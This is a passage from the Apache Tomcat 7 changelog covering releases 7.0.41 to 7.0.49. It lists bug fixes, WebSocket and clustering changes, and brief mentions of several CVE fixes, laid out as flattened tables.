(kfujino) | | --- | --- | | fix | Add time stamp to `GET_ALL_SESSIONS` message. (kfujino) | |  | **Web applications** | | --- | | | fix | Fix the sample configuration of `StaticMembershipInterceptor` in order to prevent warning log. uniqueId must be 16 bytes. (kfujino) | | --- | --- | |  | **Extras** | | --- | | | update | Update dependencies that are used to build tomcat-juli extras component. Apache Avalon Framework is updated to version 4.1.5, Apache Log4J to version 1.2.17. (rjung) | | --- | --- | | | |  | **Tomcat 7.0.49 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Correct a regression in the new XML local resolver that triggered false failures when XML validation was configured. (markt) | | --- | --- | | fix | Prevent a NPE when destroying HTTP upgrade handler for WebSocket connections. (violetagg) | | | |  | **Tomcat 7.0.48 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [51294](https://bz.apache.org/bugzilla/show_bug.cgi?id=51294): Add support for unpacking WARs located outside of the Host's appBase in to the appBase. (markt) | | --- | --- | | fix | [55656](https://bz.apache.org/bugzilla/show_bug.cgi?id=55656): Configure the Digester to use the server class loader when parsing server.xml rather than the class loader that loaded StandardServer. Patch provided by Roberto Benedetti. (markt) | | fix | [55664](https://bz.apache.org/bugzilla/show_bug.cgi?id=55664): Correctly handle JSR 356 WebSocket Encoder, Decoder and MessageHandler implementations that use a generic type such as `Encoder.Text<List<String>>`. Includes a test case by Niki Dokovski. (markt) | | fix | Correctly handle WebSocket `Encoder`s, `Decoder`s and `MessageHandler`s that use arrays of generic types. (markt) | | fix | [55681](https://bz.apache.org/bugzilla/show_bug.cgi?id=55681): Ensure that the WebSocket session is made available to `MessageHandler` method calls. (markt) | | fix | Updated servlet spec version and documentation section-number reported when JAR files are rejected for containing a trigger class (e.g. javax.servlet.Servlet). (schultz) | | add | Modify the WebSocket handshake process so that the user properties `Map` exposed by the `ServerEndpointConfig` during the call to `Configurator.modifyHandshake()` is unique to the connection rather than shared by all connections associated with the Endpoint. This allows for easier configuration of per connection properties from within `modifyHandshake()`. (markt) | | fix | [55684](https://bz.apache.org/bugzilla/show_bug.cgi?id=55684): Log a warning but continue if the memory leak detection code is unable to access all threads to check for possible memory leaks when a web application is stopped. (markt) | | fix | Define the web-fragment.xml in tomcat7-websocket.jar as a Servlet 3.0 web fragment rather than as a Servlet 3.1 web fragment. (markt) | | fix | [55715](https://bz.apache.org/bugzilla/show_bug.cgi?id=55715): Add a per web application executor to the WebSocket implementation and use it for calling `SendHandler.onResult()` when there is a chance that the current thread also initiated the write. (markt) | | fix | Prevent file descriptors leak and ensure that files are closed when configuring the web application. (violetagg) | | fix | Fixed the name of the provider-configuration file located in `tomcat7-websocket.jar!/META-INF/services` that exposes information for `javax.websocket.server.ServerEndpointConfig$Configurator` implementation. (violetagg) | | fix | [55760](https://bz.apache.org/bugzilla/show_bug.cgi?id=55760): Remove the unnecessary setting of the `javax.security.auth.useSubjectCredsOnly` system property in the `SpnegoAuthenticator` as in addition to it being unnecessary, it causes problems with using SPNEGO with IBM JDKs. Patch provided by Arunav Sanyal. (markt) | | fix | [55772](https://bz.apache.org/bugzilla/show_bug.cgi?id=55772): Ensure that the request and response are recycled after an error during asynchronous processing. Includes a test case based on code contributed by Todd West. (markt) | | fix | [55778](https://bz.apache.org/bugzilla/show_bug.cgi?id=55778): Add an option to the JNDI Realm to control the QOP used for the connection to the LDAP server after authentication when using SPNEGO with delegated credentials. This value is used to set the `javax.security.sasl.qop` environment property for the LDAP connection. (markt) | | fix | [55798](https://bz.apache.org/bugzilla/show_bug.cgi?id=55798): Log an error if the MemoryUserDatabase is unable to find the specified user database file. (markt) | | fix | [55799](https://bz.apache.org/bugzilla/show_bug.cgi?id=55799): Correctly enforce the restriction in JSR356 that no more than one data message may be sent to a remote WebSocket endpoint at a time. (markt) | | fix | When Catalina parses TLD files, always use a namespace aware parser to be consistent with how Jasper parses TLD files. The `tldNamespaceAware` attribute of the Context is now ignored. (markt) | | fix | Deprecate the `tldNamespaceAware` Context attribute as TLDs are always parsed with a namespace aware parser. (markt) | | fix | Correct a logic error that meant that unpackWARs was ignored and the WAR was always expanded if a WAR failed to deploy. (markt) | | add | Add support for defining `copyXML` on a per Context basis. (markt) | | fix | Define the expected behaviour of the automatic deployment and align the implementation to that definition. (markt) | | add | When running under a security manager, change the default value of the Host's `deployXML` attribute to `false`. (markt) | | add | If a Host is configured with a value of `false` for `deployXML`, a web application has an embedded descriptor at `META-INF/context.xml` and no explicit descriptor has been defined for this application, do not allow the application to start. The reason for this is that the embedded descriptor may contain configuration necessary for secure operation such as a `RemoteAddrValve`. (markt) | | fix | Prevent an NPE in the WebSocket `ServerContainer` when processing an HTTP session end event. (markt) | | add | [55801](https://bz.apache.org/bugzilla/show_bug.cgi?id=55801): Add the ability to set a custom `SSLContext` to use for client wss connections. Patch provided by Maciej Lypik. (markt) | | fix | [55804](https://bz.apache.org/bugzilla/show_bug.cgi?id=55804): If the GSSCredential for the cached Principal expires when using SPNEGO authentication, force a re-authentication. (markt) | | add | [55811](https://bz.apache.org/bugzilla/show_bug.cgi?id=55811): If the main web.xml contains an empty absolute-ordering element and validation of web.xml is not enabled, skip parsing any web-fragment.xml files as the result is never used. (markt) | | fix | [55839](https://bz.apache.org/bugzilla/show_bug.cgi?id=55839): Extend support for digest prefixes {MD5}, {SHA} and {SSHA} to all Realms rather than just the JNDIRealm. (markt) | | fix | [55842](https://bz.apache.org/bugzilla/show_bug.cgi?id=55842): Ensure that if a larger than default response buffer is configured that the full buffer is used when a Servlet outputs via a Writer. (markt) | | fix | [55851](https://bz.apache.org/bugzilla/show_bug.cgi?id=55851): Further fixes to enable SPNEGO authentication to work with IBM JDKs. Based on a patch by Arunav Sanyal. (markt) | | add | Fix CVE-2013-4590: Add an option to the Context to control the blocking of XML external entities when parsing XML configuration files and enable this blocking by default when a security manager is used. The block is implemented via a custom resolver to enable the logging of any blocked entities. (markt) | |  | **Coyote** | | --- | | | code | Implement a number of small refactorings to the APR/native handler for upgraded HTTP connections. (markt) | | --- | --- | | fix | Fix an issue with upgraded HTTP connections over HTTPS (e.g. secure WebSocket) when using the APR/native connector that resulted in the unexpected closure of the connection. (markt) | | fix | Ensure that the application class loader is used when calling the `ReadListener` and `WriteListener` methods when using non-blocking IO. A side effect of not doing this was that JNDI was not available when processing WebSocket events. (markt) | | add | Make the time that the internal executor (if used) waits for request processing threads to terminate before continuing with the connector stop process configurable. (markt) | | fix | [55749](https://bz.apache.org/bugzilla/show_bug.cgi?id=55749): Improve the error message when `SSLEngine` is disabled in the `AprLifecycleListener` and SSL is configured for an APR/native connector. (markt) | | add | If a request that includes an `Expect: 100-continue` header receives anything other than a 2xx response, close the connection This protects against misbehaving clients that may not sent the request body in that case and send the next request instead. (markt) | | fix | Improve the parsing of trailing headers in HTTP requests. (markt) | |  | **Jasper** | | --- | | | fix | [55735](https://bz.apache.org/bugzilla/show_bug.cgi?id=55735): Fix a regression caused by the fix to [55198](https://bz.apache.org/bugzilla/show_bug.cgi?id=55198). When processing JSP documents, attributes in XML elements that are template content should have their text xml-escaped, but output of EL expressions in them should not be escaped. (markt) | | --- | --- | | fix | [55807](https://bz.apache.org/bugzilla/show_bug.cgi?id=55807): The JSP compiler used a last modified time of -1 for TLDs in JARs expanded in to WEB-INF/classes (IDEs often do this expansion) when creating the dependency list for JSPs that used that TLD. This meant JSPs using that TLD were recompiled on every access. (markt) | |  | **Cluster** | | --- | | | add | Add log message that initialization of `AbstractReplicatedMap` has been completed. (kfujino) | | --- | --- | | fix | The logger of `AbstractReplicatedMap` should be non-static in order to enable logging of each application. Side-effects of this change is to throw `RuntimeException` in `MapMessage#getKey()` and `getValue()` instead of Null return and error log. (kfujino) | | code | Simplify the code of `DeltaManager#startInternal()`. Reduce unnecessary nesting for acquisition of cluster instance. (kfujino) | | fix | Remove unnecessary attributes of `stateTransferCreateSendTime` and `receiverQueue` from cluster manager template. These attributes should not be defined as a template. (kfujino) | | fix | Fix MBean attribute definition of `stateTransfered`. The method name is not `isStateTransfered()` but `getStateTransfered()`. (kfujino) | | fix | Correct stop failure log of cluster. Failure cause is not only Valve. (kfujino) | | fix | Remove unnecessary sleep when sending session blocks on session sync phase. (kfujino) | | fix | Expose `stateTimestampDrop` of `org.apache.catalina.ha.session.DeltaManager` via JMX. (kfujino) | | fix | When the ping timeouted, make sure that `memberDisappeared` method is not called by specifying the members that has already been removed. (kfujino) | | add | Add log message of session relocation when member disappeared. (kfujino) | | fix | If ping message fails, prevent wrong timeout detection of normal member that is no failure members. (kfujino) | |  | **Web applications** | | --- | | | add | Add some documentation on the SSL configuration options for WebSocket clients. (markt) | | --- | --- | | add | Add to cluster document a description of `notifyLifecycleListenerOnFailure` and `heartbeatBackgroundEnabled`. (kfujino) | | fix | Update the documentation with information for WebSocket 1.0 specification and javadoc. (violetagg) | | fix | [55703](https://bz.apache.org/bugzilla/show_bug.cgi?id=55703): Clarify the role of the singleton attribute for JNDI resource factories. (markt) | | fix | [55746](https://bz.apache.org/bugzilla/show_bug.cgi?id=55746): Add documentation on the `allRolesMode` to the `CombinedRealm` and `LockOutRealm`. Patch by Cédric Couralet. (markt) | | add | Expand the information on web applications that ship as part of Tomcat in the security how-to section of the documentation web application. (markt) | | fix | Expand the description of the WebSocket buffers in the documentation web application to clarify their purpose. (markt) | | add | Correct the documentation for Cluster manager. (kfujino) | | add | Add information on how to configure integrated Windows authentication when Tomcat is running on a non-Windows host. (markt) | |  | **Extras** | | --- | | | update | Update commons-logging to version 1.1.3. (rjung) | | --- | --- | |  | **Other** | | --- | | | add | [52323](https://bz.apache.org/bugzilla/show_bug.cgi?id=52323): Add support for the Cobertura code coverage tool when running the unit tests. Based on a patch by mhasko. (markt/kkolinko) | | --- | --- | | update | Update sample Eclipse IDE project. Explicitly use a Java 6 SE JDK. Exclude JSR356 WebSocket classes from build path, as they cannot be compiled with Java 6. (kkolinko) | | update | Update the Eclipse compiler to 4.3.1. (kkolinko/markt) | | | |  | **Tomcat 7.0.47 (violetagg)** | **released 2013-10-24** | | --- | --- | | | **Coyote** | | --- | | | fix | Fix regression with legacy WebSocket implementation in NIO and APR connectors. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Avoid hang observed with Java 6 on Windows when stopping the Tomcat process via CTRL-C. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | [55663](https://bz.apache.org/bugzilla/show_bug.cgi?id=55663): NOTICE files are corrected according to [NOTICE files requirements](http://www.apache.org/legal/src-headers.html#notice). (violetagg) | | --- | --- | | | |  | **Tomcat 7.0.46 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Only send a WebSocket close message on an IOException if the client has not yet received a close control message from the server as the IOException may be in response to the client continuing to send a message after the server sent a close control message. (markt) | | --- | --- | | fix | [49134](https://bz.apache.org/bugzilla/show_bug.cgi?id=49134): Ensure nested realms are correctly destroyed, when a CombinedRealm is destroyed. This ensures that the associated MBeans are deregistered. (markt) | |  | **Coyote** | | --- | | | code | Refactor APR/native connector to reduce the scope of `localAddList`. (markt) | | --- | --- | | fix | [55602](https://bz.apache.org/bugzilla/show_bug.cgi?id=55602): Ensure that sockets removed from the Poller and then closed in the APR/native connector are removed and then closed in a thread-safe manner. (markt) | | fix | Update the APR/native connector to version 1.1.29. (violetagg) | |  | **Jasper** | | --- | | | fix | [55642](https://bz.apache.org/bugzilla/show_bug.cgi?id=55642): Correct logic error in the JSP parser that was incorrectly identifying EL expressions in jsp:param element values as a literal string. (markt) | | --- | --- | |  | **Cluster** | | --- | | | add | Add support for notify periodic event of cluster. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct the javadoc for `org.apache.catalina.Lifecycle`. (kfujino) | | --- | --- | | add | Add document for sessionIdAttribute attribute in `org.apache.catalina.ha.session.JvmRouteBinderValve`. (kfujino) | | fix | Handle the case when a user closes the browser whilst playing the snake game in the JSR356 WebSocket examples. (markt) | | fix | Ensure Javadoc comments are associated with the correct elements in `org.apache.tomcat.jni.Poll`. (markt) | | add | Expand Context documentation for the use of `sessionCookiePath="/"` to make the implications for session fixation protection clearer. (markt) | | fix | [55629](https://bz.apache.org/bugzilla/show_bug.cgi?id=55629): Ensure that the JMX notification listener added during initialization of the servlet org.apache.catalina.manager.StatusManagerServlet is removed in the destroy phase. (violetagg) | | fix | Correct the documentation for Deployment Organization in the App Dev Guide. (violetagg) | | add | [55639](https://bz.apache.org/bugzilla/show_bug.cgi?id=55639): Add a Drawboard WebSocket example. (kpreisser) | | | |  | **Tomcat 7.0.45 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [55576](https://bz.apache.org/bugzilla/show_bug.cgi?id=55576): Preserve the order in which request parameters were received when accessing them via the Servlet API. (markt) | | --- | --- | |  | **Cluster** | | --- | | | fix | Logger instance of cluster session manager is changed to non-static in order to enable logging of each application. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.44 (violetagg)** | **not released** | | --- | --- | | | **Jasper** | | --- | | | fix | [55582](https://bz.apache.org/bugzilla/show_bug.cgi?id=55582): Correct concurrency issue that can result in two instances of JspServletWrapper being created for one tag Patch provided by Sheldon Shao. (markt) | | --- | --- | | | |  | **Tomcat 7.0.43 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [51526](https://bz.apache.org/bugzilla/show_bug.cgi?id=51526): `o.a.catalina.startup.Tomcat#addWebapp` methods now process the web application's `META-INF/context.xml` when it is available in the provided path. (violetagg) | | --- | --- | | fix | [55186](https://bz.apache.org/bugzilla/show_bug.cgi?id=55186): Ensure local name is recycled between requests so IP virtual hosting works correctly. (markt) | | fix | [55210](https://bz.apache.org/bugzilla/show_bug.cgi?id=55210): Correct the processing of the provider-configuration file for `javax.servlet.ServletContainerInitializer` in the resource directory `META-INF/services` when this file contains comments and multiple SCIs. Patch provided by Nick Williams. (violetagg) | | fix | [55230](https://bz.apache.org/bugzilla/show_bug.cgi?id=55230): Use the correct resource path when obtaining an InputStream for resources served by a ProxyDirContext. (markt) | | fix | Ensure that the JAR scanning process scans the Apache Log4j version 2 JARs. Patch provided by Nick Williams. (markt) | | fix | [55261](https://bz.apache.org/bugzilla/show_bug.cgi?id=55261): Fix failing unit test for file upload checks when running on platform / JVM combinations that have large network buffers. (markt) | | fix | [55268](https://bz.apache.org/bugzilla/show_bug.cgi?id=55268): Added optional --service-start-wait-time command-line option to change service start wait time from default of 10 seconds. | | fix | The `contextClass` attribute of `HostConfig` refers to the value of the `contextClass` attribute of Host. (kfujino) | | fix | [55331](https://bz.apache.org/bugzilla/show_bug.cgi?id=55331): Dispatching to an asynchronous servlet from `AsyncListener.onTimeout()` should not trigger an `IllegalStateException`. (markt) | | fix | [55333](https://bz.apache.org/bugzilla/show_bug.cgi?id=55333): Correct a regression in the fix for [55071](https://bz.apache.org/bugzilla/show_bug.cgi?id=55071). (markt) | | fix | When using a security manager, ensure that calls to the ServletContext that are routed via an `AccessController.doPrivileged` block do not result in a call to a different underlying method on the ServletContext. (markt) | | fix | [55354](https://bz.apache.org/bugzilla/show_bug.cgi?id=55354): Ensure that the naming context environment parameters are restored after associating the Principle with the user name. Based on patch provided by Richard Begg. (violetagg) | | fix | [55357](https://bz.apache.org/bugzilla/show_bug.cgi?id=55357): Ensure the web application class loader is set as a thread context class loader during session deserialization. (violetagg) | | fix | [55404](https://bz.apache.org/bugzilla/show_bug.cgi?id=55404): Log warnings about using security roles in web.xml without defining them as warnings. (markt) | | fix | [55439](https://bz.apache.org/bugzilla/show_bug.cgi?id=55439): Don't try a forced stop when `stop -force` is used if Tomcat has already been stopped. This avoids error messages when the PID file has been cleared. If a forced stop is required, improve handling of the case when the PID file can be read from or written to but not deleted. (markt) | | fix | [55454](https://bz.apache.org/bugzilla/show_bug.cgi?id=55454): Avoid NPE when parsing an incorrect content type. (violetagg) | | update | Back-port the JSR-356 Java WebSocket 1.0 implementation from Tomcat 8. Note that use of this functionality requires Java 7. (markt) | | update | Deprecate the Tomcat proprietary WebSocket API in favour of the new JSR-356 implementation. (markt) | | fix | [55494](https://bz.apache.org/bugzilla/show_bug.cgi?id=55494): Reduce severity of log message from warning to information for JNDI Realm connection issues where the JNDI Realm automatically re-tries the action that failed. Make clear in the log message that the action is being re-tried. (markt) | | fix | Correct several incorrect formats of `JdkLoggerFormatter`. (kfujino) | | fix | [55521](https://bz.apache.org/bugzilla/show_bug.cgi?id=55521): Ensure that calls to `HttpSession.invalidate()` do not return until the session has been invalidated. Also ensure that checks on the validity of a session return a result consistent with any previous call to `HttpSession.invalidate()`. (markt) | | fix | [55524](https://bz.apache.org/bugzilla/show_bug.cgi?id=55524): Refactor to avoid a possible deadlock when handling an `IOException` during output when using Tomcat' proprietary (and deprecated) WebSocket API. (markt) | | fix | The loaded attribute never exists in `PersistentManager`. isLoaded is defined as operation in mbeans-descriptors. (kfujino) | | add | Added logging of logging.properties location when system property `org.apache.juli.ClassLoaderLogManager.debug=true` is set. | | fix | [55570](https://bz.apache.org/bugzilla/show_bug.cgi?id=55570): Correctly log exceptions for all error conditions in the SPNEGO authenticator. (markt) | |  | **Coyote** | | --- | | | fix | [55228](https://bz.apache.org/bugzilla/show_bug.cgi?id=55228): Allow web applications to set a HTTP Date header. (markt) | | --- | --- | | add | Expose the current connection count for each protocol handler via JMX. (markt) | | fix | [55267](https://bz.apache.org/bugzilla/show_bug.cgi?id=55267): If an application configures a timeout for a Comet connection ensure it is only used for read and not write operations. This prevents a long timeout delaying the closing of the socket associated with a Comet connection after an error occurs. (markt) | | fix | Ensure that `java.lang.VirtualMachineError`s are not swallowed when using the HTTP or AJP NIO connectors. (markt) | | fix | [55399](https://bz.apache.org/bugzilla/show_bug.cgi?id=55399): Use the response locale to select the language to use for the status message in the HTTP response. (markt) | | update | Refactor the connectors to support the new JSR-356 Java WebSocket 1.0 implementation. The most noticeable change is that the AJP APR/native and HTTP APR/native connectors no longer support multiple poller threads. Both connectors now use a single poller thread. (markt) | | fix | Internally, content length is managed as a `long`. Fix a few places in the AJP connector where this was restricted to an `int`. (markt) | | fix | [55453](https://bz.apache.org/bugzilla/show_bug.cgi?id=55453): Ensure that the AJP connector does not permit response bodies to be included for responses with status codes and/or request methods that are not permitted to have a response body. (markt) | | fix | [55500](https://bz.apache.org/bugzilla/show_bug.cgi?id=55500): Don't ignore the value of an asynchronous context timeout when using the AJP NIO connector. (markt) | | fix | Fix CVE-2013-4286: Better adherence to RFC2616 for content-length headers. (markt) | | fix | Fix CVE-2013-4322: Add support for limiting the size of chunk extensions when using chunked encoding. (markt) | | fix | Update the APR/native connector to version 1.1.28. Make this the minimum acceptable version as the correct behaviour of the JSR-356 WebSocket implementation when using the APR/native HTTP connector depends on a bug fix in the 1.1.28 release. (markt) | |  | **Jasper** | | --- | | | fix | [55198](https://bz.apache.org/bugzilla/show_bug.cgi?id=55198): Ensure attribute values in tagx files that include EL and quoted XML characters are correctly quoted in the output. (markt) | | --- | --- | | fix | Ensure that `javax.el.ELContext.getContext(Class)` will throw `NullPointerException` when the provided class is null. (violetagg) | | fix | Ensure that `FeatureDescriptor` objects returned by `javax.el.MapELResolver.getFeatureDescriptors(ELContext,Object)` will be created with a correct `shortDescription` - an empty string and a named attribute `ELResolver.RESOLVABLE_AT_DESIGN_TIME` - true. (violetagg) | | fix | Ensure that `FeatureDescriptor` objects returned by `javax.el.ResourceBundleELResolver.getFeatureDescriptors(ELContext,Object)` will be created with a correct `shortDescription` - an empty string. `javax.el.ResourceBundleELResolver.isReadOnly(ELContext,Object,Object)` returns true if the base object is an instance of ResourceBundle. (violetagg) | | fix | [55207](https://bz.apache.org/bugzilla/show_bug.cgi?id=55207): Enforce the restriction that a <jsp:text> element may not contain any sub-elements from any namespace. Patch provided by Jeremy Boynes. (markt) | | fix | Ensure that `javax.el.ListELResolver.getFeatureDescriptors(ELContext,Object)` will always return null. `javax.el.ListELResolver.isReadOnly(ELContext,Object,Object)` will return a result when the property cannot be coerced into an integer. (violetagg) | | fix | Ensure that `javax.el.ArrayELResolver.getFeatureDescriptors(ELContext,Object)` will always return null. `javax.el.ArrayELResolver.isReadOnly(ELContext,Object,Object)` and `javax.el.ArrayELResolver.getType(ELContext,Object,Object)` will return a result when the property cannot be coerced into an integer. (violetagg) | | fix | [55309](https://bz.apache.org/bugzilla/show_bug.cgi?id=55309): Fix concurrency issue with JSP compilation and the tag plug-in manager. Patch provided by Sheldon Shao. (markt) | | fix | Ensure that `javax.el.BeanELResolver.getFeatureDescriptors(ELContext,Object)` and `javax.el.BeanELResolver.getCommonPropertyType(ELContext,Object)` do not throw `NullPointerException` when the provided context is null. (violetagg) | |  | **Cluster** | | --- | | | add | Add new attribute terminateOnStartFailure. Set to true if you wish to terminate replication map when replication map fails to start. If replication map is terminated, associated context will fail to start. If you set this attribute to false, replication map does not end. It will try to join the map membership in the heartbeat. Default value is false. (kfujino) | | --- | --- | | fix | Avoid ConcurrentModificationException when sending a heartbeat. (kfujino) | | fix | Avoid NPE when the channel fails to start. (kfujino) | | fix | [55301](https://bz.apache.org/bugzilla/show_bug.cgi?id=55301): Fix `IllegalArgumentException` thrown by simple test for McastService. (kfujino) | | fix | [55332](https://bz.apache.org/bugzilla/show_bug.cgi?id=55332): Fix NPE in `FileMessageFactory.main` when specify empty file as arguments. (kfujino) | | fix | More definite thread name for `MessageDispatch15Interceptor`. (kfujino) | |  | **Web applications** | | --- | | | update | Remove the experimental label from the AJP NIO connector documentation. (markt) | | --- | --- | | fix | Correctly associated the default resource bundle with the English locale so that requests that specify an Accept-Language of English ahead of French, Spanish or Japanese get the English messages they asked for. (markt) | | fix | [55469](https://bz.apache.org/bugzilla/show_bug.cgi?id=55469): Fixed tags that were not properly closed. Based on a patch provided by Larry Shatzer, jr. (violetagg) | | update | The WebSocket examples in the examples web application have been changed to use the new JSR-356 Java WebSocket 1.0 implementation. (markt) | | add | Add document for `org.apache.catalina.tribes.group.GroupChannel`. (kfujino) | | fix | Correct Realm Component page of Tomcat documentation. (violetagg) | |  | **jdbc-pool** | | --- | | | fix | [54693](https://bz.apache.org/bugzilla/show_bug.cgi?id=54693): Add a validationQueryTimeout property. Patch provided by Daniel Mikusa. (kfujino) | | --- | --- | | fix | [54693#c6](https://bz.apache.org/bugzilla/show_bug.cgi?id=54693#c6): Avoid NPE caused by `createConnection()` method returns null. Patch provided by Daniel Mikusa. (kfujino) | | fix | [55342](https://bz.apache.org/bugzilla/show_bug.cgi?id=55342): Remove unnecessary reset of interrupted flag. If `InterruptedException` is thrown, the interrupted flag has been cleared. (kfujino) | | fix | [55343](https://bz.apache.org/bugzilla/show_bug.cgi?id=55343): Add flag to ignore exceptions of connection creation while initializing the pool. (kfujino) | | fix | Add undefined attributes and operations to mbeans-descriptor. (kfujino) | |  | **Other** | | --- | | | add | [45428](https://bz.apache.org/bugzilla/show_bug.cgi?id=45428): Trigger a thread dump written to standard out if Tomcat fails to stop in a timely manner to aid diagnostics. This is only available on platforms that use `catalina.sh`. (markt) | | --- | --- | | fix | [55204](https://bz.apache.org/bugzilla/show_bug.cgi?id=55204): Correct namespace used in Servlet 2.4 test web application. Patch provided by Jeremy Boynes. (markt) | | fix | [55205](https://bz.apache.org/bugzilla/show_bug.cgi?id=55205): Reorder elements so web.xml complies with schema for Servlet 3.0 test web application. Patch provided by Jeremy Boynes. (markt) | | fix | [55211](https://bz.apache.org/bugzilla/show_bug.cgi?id=55211): Correct namespace in TLD files used in test web applications. Rename elements `tagclass` to `tag-class` so TLD files complies with DTD/schema. Patch provided by Jeremy Boynes. (violetagg) | | update | Update package renamed version of Commons BCEL to the latest code from Commons BCEL trunk. (markt) | | update | Update package renamed version of Commons FileUpload to the latest code from Commons FileUpload trunk. (markt) | | fix | [55297](https://bz.apache.org/bugzilla/show_bug.cgi?id=55297): When looking for the jsvc executable, if an explicit path is not set and it is not found in $CATALINA\_BASE, look in $CATALINA\_HOME as well. (markt) | | fix | [55336](https://bz.apache.org/bugzilla/show_bug.cgi?id=55336): Correctly escape parameters passed to eval in the catalina.sh script to ensure that Tomcat starts when installed on a path that contains multiple consecutive spaces. (markt) | | | |  | **Tomcat 7.0.42 (markt)** | **released 2013-07-05** | | --- | --- | | | **Catalina** | | --- | | | fix | Enforce the restriction described in section 4.4 of the Servlet 3.0 specification that requires the new pluggability methods only to be available to `ServletContextListener`s defined in one of the specified ways. (markt) | | --- | --- | | fix | Better handle FORM authentication when requesting a resource as an unauthenticated user that is only protected for a sub-set of HTTP methods that does not include GET. (markt) | | fix | [53777](https://bz.apache.org/bugzilla/show_bug.cgi?id=53777): Add support for a JAAS Realm instance to use a dedicated configuration rather than the JVM global JAAS configuration. This is most likely to be useful for per web application JAAS Realms. Based on a patch by eolivelli. (markt) | | fix | [54745](https://bz.apache.org/bugzilla/show_bug.cgi?id=54745): Fix JAR file scanning when Tomcat is deployed via Java Web Start. Patch provided by Nick Williams. (markt) | | add | [55017](https://bz.apache.org/bugzilla/show_bug.cgi?id=55017): Add the ability to configure the RMI bind address when using the JMX remote lifecycle listener. Patch provided by Alexey Noskov. (markt) | | fix | [55071](https://bz.apache.org/bugzilla/show_bug.cgi?id=55071): Ensure original exception is reported if JDBC Realm fails to read a user's credentials. (markt) | | fix | [55073](https://bz.apache.org/bugzilla/show_bug.cgi?id=55073), [55108](https://bz.apache.org/bugzilla/show_bug.cgi?id=55108), [55109](https://bz.apache.org/bugzilla/show_bug.cgi?id=55109), [55110](https://bz.apache.org/bugzilla/show_bug.cgi?id=55110), [55158](https://bz.apache.org/bugzilla/show_bug.cgi?id=55158) & [55159](https://bz.apache.org/bugzilla/show_bug.cgi?id=55159): Small performance improvements. Patches provided by Adrian Nistor. (markt/violetagg) | | add | [55102](https://bz.apache.org/bugzilla/show_bug.cgi?id=55102): Add support for time to first byte in the AccessLogValve. Patch provided by Jeremy Boynes. (markt) | | fix | [55125](https://bz.apache.org/bugzilla/show_bug.cgi?id=55125): If the Server container fails to start, don't allow the Catalina wrapper to start (used when running from the command line and when running as a service) since Tomcat will not be able to do any useful work. (markt) | | fix | Update the `JreMemoryLeakPreventionListener` to take account of changes in the behaviour of `java.beans.Introspector.flushCaches()` and `sun.awt.AppContext.getAppContext()` in Java 7. (markt) | | fix | Avoid WARNING log message of `Users:type=UserDatabase,database=UserDatabase` at Tomcat shutdown. (pero) | | fix | Avoid `ClassCastException` when an asynchronous dispatch is invoked in an asynchronous cycle which is started by a call to `ServletRequest.startAsync(ServletRequest,ServletResponse)` where ServletRequest/ServletResponse are custom implementations. (violetagg) | | fix | Correct a regression introduced in 7.0.39 (refactoring of base 64 encoding and decoding) that broke the JNDI Realm when `userPassword` was set and passwords were hashed with MD5 or SHA1. (markt/kkolinko) | | fix | Correct the mechanism for the path calculation in `AsyncContext.dispatch()`. (violetagg) | | fix | [55155](https://bz.apache.org/bugzilla/show_bug.cgi?id=55155): Avoid constant focus grabbing when running the Tomcat unit tests under Java 6 on OSX. Patch provided by Casey Lucas. (markt) | | fix | [55160](https://bz.apache.org/bugzilla/show_bug.cgi?id=55160): Don't ignore connectionUploadTimeout setting when using HTTP NIO connector. (markt) | | fix | [55176](https://bz.apache.org/bugzilla/show_bug.cgi?id=55176): Correctly handle regular expressions within SSI expressions that contain an equals character. (markt) | |  | **Coyote** | | --- | | | fix | [55177](https://bz.apache.org/bugzilla/show_bug.cgi?id=55177): Correctly handle infinite soTimeout for BIO HTTP connector. Based on a patch by Nick Bunn. (markt) | | --- | --- | | fix | [55180](https://bz.apache.org/bugzilla/show_bug.cgi?id=55180): Correctly handle infinite soTimeout when `disableUploadTimeout` is set to false. Patch provided by Nick Bunn. (violetagg) | |  | **Cluster** | | --- | | | fix | Delete leftover of war file from tempDir when removing invalid `FileMessageFactory`. (kfujino) | | --- | --- | | fix | Ensure that the keepAlive of NioSender works correctly when `keepAliveCount`/`keepAliveTime` is set to a value greater than 0. (kfujino) | | add | Add logging of when a member is unable to join the cluster. (kfujino) | | fix | Replace Tribes's `TaskQueue` as executor's workQueue in order to ensure that executor's `maxThread` works correctly. (kfujino) | | fix | [54086](https://bz.apache.org/bugzilla/show_bug.cgi?id=54086): Fix an additional code path that could lead to multiple threads attempting to modify the same selector key set. (markt) | |  | **Web applications** | | --- | | | add | Complete the document for `MessageDispatch15Interceptor`. (kfujino) | | --- | --- | | add | [53655](https://bz.apache.org/bugzilla/show_bug.cgi?id=53655): Document the circumstances under which Tomcat will add a `javax.mail.Authenticator` to mail sessions created via a JNDI resource. (markt) | | fix | [55179](https://bz.apache.org/bugzilla/show_bug.cgi?id=55179): Correct the Javadoc for the remote IP valve so the correct name is used to refer to the `proxiesHeader` property. (markt) | |  | **jdbc-pool** | | --- | | | fix | [55031](https://bz.apache.org/bugzilla/show_bug.cgi?id=55031): Fixed `Export-Package` header and `uses` directives in MANIFEST.MF. Change the version for package `org.apache.juli.logging` to "0" in `Import-Package` header. Thus any version of that package can be used. Patch provided by Martin Lichtin. (violetagg) | | --- | --- | |  | **Other** | | --- | | | update | Update Maven Central location used to download dependencies at build time to be `repo.maven.apache.org`. (kkolinko) | | --- | --- | | update | Update JUnit to version 4.11. Configure separate download for Hamcrest 1.3 core library as its classes are no longer included in junit.jar. (kkolinko) | | fix | [54013](https://bz.apache.org/bugzilla/show_bug.cgi?id=54013): When using a forced stop, allow a short period of time (5s) for the process to die before returning. Patch provided by mukarram.baig. (markt) | | fix | [55119](https://bz.apache.org/bugzilla/show_bug.cgi?id=55119): Ensure that the build process produces Javadoc that is not vulnerable to CVE-2013-1571. Based on a patch by Uwe Schindler. (markt) | | | |  | **Tomcat 7.0.41 (markt)** | **released 2013-06-10** | | --- | --- | | | **Catalina** | | --- | | | fix | 